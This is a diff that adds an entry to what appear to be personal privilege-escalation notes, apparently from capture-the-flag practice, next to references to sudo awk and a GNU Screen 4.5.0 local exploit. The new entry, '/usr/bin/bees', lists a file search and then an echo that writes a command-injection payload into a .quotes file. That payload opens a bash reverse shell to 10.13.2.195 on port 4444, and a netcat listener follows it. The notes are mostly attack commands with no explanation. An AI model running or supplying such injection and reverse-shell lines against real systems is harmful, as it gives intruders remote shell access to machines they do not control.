@@ -245,3 +245,13 @@ ALL=(root) NOPASSWD: /usr/bin/awk
  ```````````
 sh GNU Screen 4.5.0 - Local Privilege Escalation.py
 ```````````````````````````````````````````````````````
+
+# 15.  /usr/bin/bees
+  - find / -type f -user cage 2>/dev/null
+  
+ ````````````````````
+ echo ';bash -c bash -i >& /dev/tcp/10.13.2.195/4444 0>&1"' > .quotes
+ 
+ sudo nc -lvnp 4444
+ ```````````````````````````
+ 
